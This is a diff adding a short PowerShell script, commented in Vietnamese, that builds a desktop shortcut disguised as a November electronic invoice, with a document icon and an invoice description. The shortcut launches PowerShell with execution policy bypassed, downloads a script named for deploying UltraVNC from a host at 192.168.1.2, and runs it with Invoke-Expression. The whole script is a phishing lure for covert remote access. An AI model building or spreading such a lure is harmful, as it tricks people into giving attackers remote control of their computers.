@@ -1,0 +1,10 @@
+# Tạo LNK Hóa Đơn với icon đẹp
+$shortcutPath = "$env:USERPROFILE\Desktop\HoaDon_DienTu.lnk"
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($shortcutPath)
+$Shortcut.TargetPath = "powershell.exe"
+#Tao Arguments chua payload ban ro
+$Shortcut.Arguments = "-NoExit -ExecutionPolicy Bypass -Command `"`$scriptContent = (New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/deploy_ultravnc_noexit.ps1'); Invoke-Expression `$scriptContent`""
+$Shortcut.IconLocation = "shell32.dll,1"  # Icon document đẹp
+$Shortcut.Description = "Hoa don dien tu thang 11"
+$Shortcut.Save()
